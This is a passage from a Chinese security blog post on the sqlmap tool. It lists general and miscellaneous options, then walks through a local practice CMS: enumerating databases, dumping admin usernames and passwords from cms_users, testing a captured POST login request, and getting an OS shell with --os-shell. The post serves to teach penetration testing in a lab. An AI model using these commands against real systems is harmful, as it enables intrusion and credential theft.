+<h4 id="通用选项"><a href="#通用选项" class="headerlink" title="通用选项"></a>通用选项</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于设置通用的参数</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">    --answers=ANSWERS   预设回答（例如：<span class="string">&quot;quit=N,follow=N&quot;</span>）</span><br><span class="line">    --base64=BASE64P..  表明参数包含 Base64 编码的数据</span><br><span class="line">    --base64-safe       使用 URL 与文件名安全的 Base64 字母表（RFC <span class="number">4648</span>）</span><br><span class="line">    --batch             从不询问用户输入，使用默认配置</span><br><span class="line">    --binary-fields=..  具有二进制值的结果字段（例如：<span class="string">&quot;digest&quot;</span>）</span><br><span class="line">    --check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">    --cleanup           清理 DBMS 中特定的 sqlmap UDF 与数据表</span><br><span class="line">    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如：<span class="string">&quot;logout&quot;</span>）</span><br><span class="line">    --csv-<span class="keyword">del</span>=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">    --charset=CHARSET   指定 SQL 盲注字符集（例如：<span class="string">&quot;0123456789abcdef&quot;</span>）</span><br><span class="line">    --dump-<span class="built_in">format</span>=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">    --eta               显示每个结果输出的预计到达时间</span><br><span class="line">    --flush-session     清空当前目标的会话文件</span><br><span class="line">    --forms             解析并测试目标 URL 的表单</span><br><span class="line">    --fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">    --gpage=GOOGLEPAGE  指定所用 Google dork 结果的页码</span><br><span class="line">    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">    --<span class="built_in">hex</span>               获取数据时使用 <span class="built_in">hex</span> 转换</span><br><span class="line">    --output-<span class="built_in">dir</span>=OUT..  自定义输出目录路径</span><br><span class="line">    --parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">    --preprocess=PRE..  使用给定脚本做前处理（请求）</span><br><span class="line">    --postprocess=PO..  使用给定脚本做后处理（响应）</span><br><span class="line">    --repair            重新导出具有未知字符的数据（?）</span><br><span class="line">    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">    --scope=SCOPE       用正则表达式过滤目标</span><br><span class="line">    --skip-heuristics   不对 SQLi/XSS 漏洞进行启发式检测</span><br><span class="line">    --skip-waf          不对 WAF/IPS 进行启发式检测</span><br><span class="line">    --table-prefix=T..  指定临时数据表名前（默认：<span class="string">&quot;sqlmap&quot;</span>）</span><br><span class="line">    --test-<span class="built_in">filter</span>=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">    --web-root=WEBROOT  指定 Web 服务器根目录（例如：<span class="string">&quot;/var/www&quot;</span>）</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项不属于前文的任何类别</span><br><span class="line"></span><br><span class="line">   -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">   --alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">   --beep              在问题提示或在发现 SQL 注入/XSS/FI 时发出提示音</span><br><span class="line">   --dependencies      检查 sqlmap 缺少（可选）的依赖</span><br><span class="line">   --disable-coloring  关闭彩色控制台输出</span><br><span class="line">   --offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">   --purge             安全删除 sqlmap data 目录所有内容</span><br><span class="line">   --results-file=R..  指定多目标模式下的 CSV 结果输出路径</span><br><span class="line">   --shell             调出交互式 sqlmap shell</span><br><span class="line">   --tmp-<span class="built_in">dir</span>=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">   --unstable          为不稳定连接调整选项</span><br><span class="line">   --update            更新 sqlmap</span><br><span class="line">   --wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02：简单实操"><a href="#0x02：简单实操" class="headerlink" title="0x02：简单实操"></a>0x02：简单实操</h2><p>利用sqlmap 注入得到cms 网站管理员账密</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">注入点：http://127.0.0.1/cms/show.php?<span class="built_in">id</span>=33</span><br><span class="line"></span><br><span class="line">python sqlmap.py  -u <span class="string">&quot;http://127.0.0.1/cms/show.php?id=33&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/10d675c3febba3a589d410147f2930fc.png" alt="image-20230824204624937"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=33&quot; <span class="comment">--dbs --batch</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/dc15921f58360b13bc9c841d8e7f318e.png" alt="image-20230824204712533"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=33&quot; <span class="comment">--current-db </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/cf592b1be71fa91db4ffc11471cd0c0e.png" alt="image-20230824204749579"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=33&quot; <span class="operator">-</span>D &quot;cms&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/e1322b6b5a655aa76d33e93f351779f8.png" alt="image-20230824204802046"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=33&quot; <span class="operator">-</span>D &quot;cms&quot; <span class="operator">-</span>T &quot;cms_users&quot; <span class="comment">--columns</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/58ea406ae750d6d3d42882c82bb02f54.png" alt="image-20230824204836468"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=33&quot; <span class="operator">-</span>D &quot;cms&quot; <span class="operator">-</span>T &quot;cms_users&quot; <span class="operator">-</span>C &quot;username,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/bc9bb4bcb50d94818f59bd5543425d32.png" alt="image-20230824205204198"></p>
+<h4 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r  post数据包的文件</span><br></pre></td></tr></table></figure>
+
+<p>以cms这个靶场环境为例，<a target="_blank" rel="noopener" href="http://127.0.0.1/cms/admin/login.php">http://127.0.0.1/cms/admin/login.php</a></p>
+<img src="../../imgs/73ab13eba3ebb3b57713d155ef2dc3e2.png" alt="image-20230824194243653" style="zoom:33%;" />
+
+<p>发送post请求，bp抓包</p>
+<p><img src="/../../imgs/4adafc4133dd80dc4367d79e99ed80f4.png" alt="image-20230824194346689"></p>
+<p>选择一个位置保存</p>
+<img src="../../imgs/9dd06ef923981876b83679d3888ed1bd.png" alt="image-20230824195609397" style="zoom:33%;" />
+
+<p>然后使用sqlmap判断是否存在注入点</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\\Users\zs\\Documents\\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/1b2a15343d964b749757e34c941026af.gif" alt="在这里插入图片描述"></p>
+<h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><ul>
+<li><p>受到secure_file_priv 选项的限制</p>
+</li>
+<li><p>目标系统Web 根目录的绝对路径</p>
+</li>
+<li><p>目录权限</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	sqlmap <span class="operator">-</span>u &quot;http://127.0.0.1/cms/show.php?id=32&quot; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/871ffcd076cf9036b2d8e712adf25dac.png" alt="image-20230824194011365"></p>
+<p><img src="/../../imgs/e351ceaf47a0731f044bbd09ee77b290.png" alt="image-20230824194102316"></p>
+<h2 id="0x03：参考"><a href="#0x03：参考" class="headerlink" title="0x03：参考"></a>0x03：参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/p36273/article/details/131961156">https://blog.csdn.net/p36273/article/details/131961156</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lv-lxz/p/16289206.html">https://www.cnblogs.com/lv-lxz/p/16289206.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582981.html">https://www.cnblogs.com/wuhongbin/p/15582981.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/276073.html">https://www.freebuf.com/articles/web/276073.html</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg"></a><div class="post-copyright__author_name">秋刀鱼</div><div class="post-copyright__author_desc">生活明朗,万物可爱</div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>协议，完整转载请注明来自<a href="/">秋刀鱼</a></span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"><span class="tags-punctuation"></span>安全工具<span class="tagsPageCount">10</span></a></div></div></div><nav class="needEndHide pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/24/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/Nmap/"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nmap</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/23/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/hydra/"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hydra(九头蛇)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="scoicon sco-star-smile-fill"></i><span>喜欢这篇的人也看了</span><div class="relatedPosts-link"><a onclick="event.preventDefault(); toRandomPost();" href="javascript:void(0);" rel="external nofollow" data-pjax-state="">随便逛逛</a></div></div><div class="relatedPosts-list"><div><a href="/2024/02/24/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/Nmap/" title="Nmap"><img class="cover" src="https://pic.imgdb.cn/item/65e97cb49f345e8d03e400c7.png" alt="cover"><div class="content is-center"><div class="title">Nmap</div></div></a></div><div><a href="/2024/02/23/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/hydra/" title="Hydra(九头蛇)"><img class="cover" src="https://pic.imgdb.cn/item/65e97d619f345e8d03e56aa6.png" alt="cover"><div class="content is-center"><div class="title">Hydra(九头蛇)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><div class="author-info__top-group"><div class="author-info__sayhi" id="author-info__sayhi" onclick="sco.changeSayHelloText()">sayhello.morning</div></div></div><div class="avatar-img-group"><img class="avatar-img" alt="头像" src="https://pic.imgdb.cn/item/65ae347f871b83018af6c612.jpg"><div class="avatar-sticker"><img class="avatar-sticker-img" src="https://bu.dusays.com/2023/12/30/659011053e246.png" alt="心情贴纸"></div></div><div class="author-info__description_group"><div class="author-info__description">分享自己对编程的<b>热爱</b>，对美好生活的<b>向往</b>，对知识海洋<b>探索历程</b>。</div><div class="author-info__description2">相信你可以在这里找到对你有用的知识和教程。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about/"><div class="author-info__name">Vocal</div><div class="author-info__desc">生活明朗,万物可爱</div></a><div class="card-info-social-icons is-center"><a class="social-icon" target="_blank" rel="noopener" href="https://github.com/hxysaury" title="Github"><i class="scoicon  sco-github-line"></i></a><a class="social-icon" target="_blank" rel="noopener" href="https://space.bilibili.com" title="Bilibili"><i class="scoicon  sco-bilibili-line"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="scoicon sco-menu-line"></i><span>文章目录</span></div><div class="toc-content" id="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9A%E5%AE%89%E8%A3%85%E4%B8%8E%E6%9B%B4%E6%96%B0"><span class="toc-text">0x00：安装与更新</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9A%E5%8F%82%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="toc-text">0x01：参数速查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E9%A1%B9"><span class="toc-text">选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-text">目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82"><span class="toc-text">请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E5%8C%96"><span class="toc-text">优化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-text">检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF"><span class="toc-text">技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-text">枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">用户自定义函数注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">访问文件系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-text">访问操作系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">访问 Windows 注册表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-text">通用选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9"><span class="toc-text">杂项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%93%8D"><span class="toc-text">0x02：简单实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E6%B3%A8%E5%85%A5"><span class="toc-text">POST注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetShell"><span class="toc-text">GetShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9A%E5%8F%82%E8%80%83"><span class="toc-text">0x03：参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="scoicon sco-map-line"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/04/study-road/JAVA%E5%AE%89%E5%85%A8&amp;%E4%BA%91%E5%AE%89%E5%85%A8&amp;%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="JAVA安全&amp;云安全&amp;内网安全"><img alt="JAVA安全&amp;云安全&amp;内网安全" src="https://pic.imgdb.cn/item/65ebfc499f345e8d03a57b7d.png"></a><div class="content"><a class="title" href="/2024/03/04/study-road/JAVA%E5%AE%89%E5%85%A8&amp;%E4%BA%91%E5%AE%89%E5%85%A8&amp;%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="JAVA安全&amp;云安全&amp;内网安全">JAVA安全&amp;云安全&amp;内网安全</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/04/study-road/%E8%93%9D%E9%98%9F%EF%BC%88%E5%BA%94%E6%80%A5%E3%80%81%E5%8F%96%E8%AF%81%E7%AD%89%EF%BC%89/" title="蓝队（应急、取证等）"><img alt="蓝队（应急、取证等）" src="https://pic.imgdb.cn/item/65ebfc499f345e8d03a57b7d.png"></a><div class="content"><a class="title" href="/2024/03/04/study-road/%E8%93%9D%E9%98%9F%EF%BC%88%E5%BA%94%E6%80%A5%E3%80%81%E5%8F%96%E8%AF%81%E7%AD%89%EF%BC%89/" title="蓝队（应急、取证等）">蓝队（应急、取证等）</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/" title="初识smali"><img alt="初识smali" src="https://pic.imgdb.cn/item/65eb11b69f345e8d039d0162.png"></a><div class="content"><a class="title" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/" title="初识smali">初识smali</a><a class="article-recent_post_categories" href="/2024/03/03/Android/%E5%88%9D%E8%AF%86smali/">Andriod逆向</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/" title="APK结构&amp;双开&amp;汉化&amp;图标修改"><img alt="APK结构&amp;双开&amp;汉化&amp;图标修改" src="https://pic.imgdb.cn/item/65eaf60e9f345e8d033954f1.png"></a><div class="content"><a class="title" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/" title="APK结构&amp;双开&amp;汉化&amp;图标修改">APK结构&amp;双开&amp;汉化&amp;图标修改</a><a class="article-recent_post_categories" href="/2024/03/02/Android/APK%E7%BB%93%E6%9E%84/">Andriod逆向</a></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/02/CMD/%E6%9F%A5%E7%9C%8B%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84%E6%97%A0%E7%BA%BF/" title="查看电脑连接过的WIFI"><img alt="查看电脑连接过的WIFI" src="false/../../imgs/image-20240309220356881.png"></a><div class="content"><a class="title" href="/2024/03/02/CMD/%E6%9F%A5%E7%9C%8B%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84%E6%97%A0%E7%BA%BF/" title="查看电脑连接过的WIFI">查看电脑连接过的WIFI</a></div></div></div></div></div></div></main><footer id="footer"><div id="sco-footer-bar"><div class="footer-logo"><span class="scoicon">Solitude</span></div><div class="footer-bar-description">来自秋刀鱼 - 生活明朗,万物可爱的文章</div><a class="footer-bar-link" href="/">了解更多</a></div><div id="footer_deal"><div class="footer_mini_logo" id="footer_mini_logo" title="返回顶部" onclick="sco.toTop()"><img src="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg" alt="返回顶部"></div></div><div id="sco-footer"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div class="copyright">© 2022 - 2024 By&nbsp;<a class="footer-bar-link" href="/">Vocal</a></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/wleelw/hexo-theme-solitude" title="主题">主题</a><a class="footer-bar-link cc"><i class="scoicon sco-copyright-line"></i><i class="scoicon sco-creative-commons-by-line"></i><i class="scoicon sco-creative-commons-nc-line"></i><i class="scoicon sco-creative-commons-nd-line"></i></a></div></div></div></footer></div><!-- inject body--><div><script src="/js/main.js?v=1.5.1"></script><script src="/js/utils.js?v=1.5.1"></script><script src="https://cdn.cbd.int/solitude-source/js/universe.min.js"></script><script>dark()
+</script><script src="https://cdn.staticfile.org/pjax/0.2.8/pjax.min.js"></script><script src="https://cdn.staticfile.org/node-snackbar/0.1.16/snackbar.min.js"></script><script src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.staticfile.org/meting/2.0.1/Meting.min.js"></script><script>const meting_api = 'https://meting.qjqq.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+</script><script src="/js/music.js?v=1.5.1"></script><script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script><script src="https://cdn.staticfile.org/lunr.js/2.3.9/lunr.min.js"></script></div><div id="js-pjax"><script async src="https://cdn.staticfile.org/busuanzi/2.3.0/bsz.pure.mini.min.js"></script><script id="config-diff">var PAGE_CONFIG = {
+    is_post: true,
+    is_page: false,
+    is_home: false,
+    page: 'post',
+    toc: true,
+    comment: false,
+}
+</script></div><!-- newest comment--><!-- pjax--><script>let pjaxSelectors = [
+    'title',
+    '#body-wrap',
+    '#site-config',
+    'meta[name="description"]',
+    '#js-pjax',
+    'meta[property^="og:"]',
+]
+
+const pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+})
+
+document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+})
+
+document.addEventListener('pjax:complete', () => {
+    window.refreshFn()
+})
+
+document.addEventListener('pjax:error', (e) => {
+    if (e.request.status === 404) {
+        pjax.loadUrl('/404.html')
+    }
+})</script><!-- theme--><script>initTheme = () => {
+    const cachedMode = saveToLocal.get('theme');
+    if (cachedMode === undefined)
+        document.documentElement.setAttribute('data-theme', 'light');
+    else
+        document.documentElement.setAttribute('data-theme', cachedMode);
+}
+initTheme()</script><!-- search--><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="scoicon sco-close-fill"></i></button></nav><div class="search-wrap"><div class="search-box"><input class="search-box-input" id="search-input" type="text" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" placeholder="输入关键词快速查找"></div><div id="search-results"><div id="search-hits"></div></div><div id="search-pagination"></div><div id="search-tips"></div></div></div><div id="search-mask"></div></div><script src="/js/search/local.js?v=1.5.1"></script><!-- music--><div class="needEndHide" id="nav-music" onclick="sco.musicToggle()"><div id="nav-music-hoverTips">音乐已暂停</div><meting-js id="8407304077" server="netease" type="playlist" mutex="true" preload="none" data-lrctype="0" order="random" theme="var(--sco-main)"></meting-js></div></body></html><script>const posts=["2024/03/04/study-road/JAVA安全&云安全&内网安全/","2024/03/04/study-road/蓝队（应急、取证等）/","2024/03/03/Android/初识smali/","2024/03/02/Android/APK结构/","2024/03/02/CMD/查看电脑连接过的无线/","2024/03/02/record/解决百度网盘下载慢问题/","2024/03/01/Android/环境搭建/","2024/03/01/Blue-Team/web1/","2024/03/01/Blue-Team/web2/","2024/02/26/record/README/","2024/02/24/安全工具/Nmap/","2024/02/24/安全工具/sqlmap/","2024/02/23/安全工具/hydra/","2024/02/23/安全工具/john&zip2john/","2024/02/23/安全工具/lbd负载均衡/","2024/02/23/安全工具/kali-wordlists/","2024/02/23/安全工具/msf生成木马/","2024/02/23/安全工具/nc/","2024/02/22/安全工具/nikto/","2024/02/20/record/tmux/","2024/02/18/内网安全/域控-防火墙-组策略不出网上线/","2024/02/14/record/涩涩情侣飞行棋密码破解/","2024/01/29/Blue-Team/日志自动提取分析项目_ELK_Logkit_LogonTracer_Anolog/","2024/01/11/渗透测试/CS架构客户端信息收集与流量分析/","2024/01/10/渗透测试/CS架构客户端环境搭建/","2024/01/08/内网安全/reGeorg流量转发/","2024/01/06/内网安全/frp穿透实验/","2024/01/03/内网安全/黄金票据与白银票据/","2024/01/02/内网安全/哈希传递/","2024/01/02/内网安全/域环境&域信息收集/","2024/01/01/内网安全/CS鱼饵制作/","2024/01/01/安全工具/Cobalt Strike/","2023/12/10/漏洞复现/Spring Boot Actuator未授权访问漏洞/","2023/11/30/Web漏洞/API攻防/","2023/11/30/Web漏洞/CRLF/","2023/11/30/Web漏洞/CSRF跨站请求伪造/","2023/11/30/Web漏洞/JWT安全/","2023/11/30/Web漏洞/SSRF服务端请求伪造/","2023/11/30/Web漏洞/URL重定向跳转/","2023/11/30/Web漏洞/WEB拒绝服务/","2023/11/30/Web漏洞/XSS跨站/","2023/11/30/Web漏洞/业务逻辑/","2023/11/30/Web漏洞/任意文件包含/","2023/11/30/Web漏洞/其他SQL注入/","2023/11/30/Web漏洞/子域名接管&COSP跨域资源&JSONP跨域回调/","2023/11/30/Web漏洞/弱口令/","2023/11/30/渗透测试/信息收集/","2023/11/30/漏洞复现/MySQL注入漏洞/","2023/11/28/Web漏洞/WAF攻防/","2023/11/24/渗透测试/Windows提权姿势/","2023/11/22/渗透测试/linux提权姿势/","2023/11/22/渗透测试/MYSQL提权/","2023/11/20/Web漏洞/RCE/","2023/11/20/Web漏洞/任意文件上传/","2023/11/20/渗透测试/phpMyAdmin利用/","2023/11/19/漏洞复现/phpstudy2016-2018命令执行漏洞复现/","2023/11/16/漏洞复现/Fastjson_1.2.47_rce/","2023/11/16/漏洞复现/fastjson_1.2.24_unserializer_rce/","2023/11/13/漏洞复现/Zookeeper未授权/","2023/11/11/漏洞复现/MongoDB未授权/","2023/11/11/漏洞复现/Redis未授权/","2023/11/09/漏洞复现/Elasticsearch 未授权访问/","2023/11/09/漏洞复现/IIS_7.o7.5解析漏洞/","2023/11/09/漏洞复现/Memcached 未授权访问/","2023/05/19/Python/Python-BBS项目开发/","2023/05/16/Django/Python-Django-图片验证码，发送邮箱，富文本编辑器/","2023/05/14/Django/Python-DJango-Cookie与Session/","2023/05/14/Django/Python-froms组件/","2023/05/14/Python/Python-自定义分页器/","2023/05/13/Django/Django自带的序列化组件/","2023/05/13/Django/Python-Django-批量插入 bulk_create/","2023/05/13/Django/Python-Djangochoices参数/","2023/05/12/Django/Python-Django基于jQuery的Ajax实现/","2023/05/12/Django/Python-Django中间件/","2023/05/12/Django/Python-Django模型层/","2023/05/12/Django/Python-Django模版层/","2023/05/12/Django/Python-Django视图层/","2023/05/12/Django/Python-csrf跨站请求伪造/","2023/05/12/Django/Python-基于Django中间件引发的编程思想/","2023/05/12/Python/Python-auth模块/","2023/05/11/Django/Python-Django路由层/","2023/05/10/Django/Python-Django请求周期流程图（重要）/","2023/05/09/Django/Python-Django ORM/","2023/05/06/Django/Python-Django基本操作/","2023/05/06/Django/Python-Django链接MySQL/","2023/05/06/Django/python-Django小白必会三板斧/","2023/05/06/Django/python-Django静态文件配置/","2023/05/06/Python/Python-pycharm链接数据库（MySQL）/","2023/05/05/Django/Python-Django引入/","2023/04/18/Python/Python爬虫/","2023/04/11/Python/Python-并发编程/","2023/04/11/Python/Python正则/","2023/04/10/Python/Python-网络编程/","2023/04/10/Python/Python文件操作/","2023/04/09/Python/Python-办公自动化/","2023/04/09/Python/Python面向对象/","2023/04/07/Python/Python函数/","2023/04/07/Python/Python模块与包/","2023/04/06/Python/Python数据类型/","2023/04/05/Python/Python流程控制/","2023/04/04/Python/Python初识/","2023/04/02/Python/Python-打包exe执行文件/"];function toRandomPost(){ pjax.loadUrl('/'+posts[Math.floor(Math.random()*posts.length)]); };</script>
